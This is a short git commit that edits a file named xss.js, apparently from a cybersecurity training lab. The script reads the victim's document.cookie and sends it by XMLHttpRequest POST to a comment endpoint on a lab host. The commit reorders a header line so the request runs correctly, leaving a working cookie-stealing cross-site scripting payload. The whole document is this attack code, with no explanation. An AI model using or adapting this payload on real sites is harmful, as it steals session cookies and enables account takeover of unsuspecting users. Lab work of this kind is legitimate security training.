8a49e4fda9419ece4a805ea1fbc26c2f61905bae
desdeamon <beansranger@gmail.com>
2023-11-28 15:05:06 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,5 @@
 const XHR = new XMLHttpRequest();
 const data = JSON.stringify({"text": document.cookie})
-XHR.setRequestHeader("Content-Type", "application/json");
 XHR.open("POST", "http://website-aty3hz.inst.malicecyber.com/new_comment/1");
+XHR.setRequestHeader("Content-Type", "application/json");
 XHR.send(data);
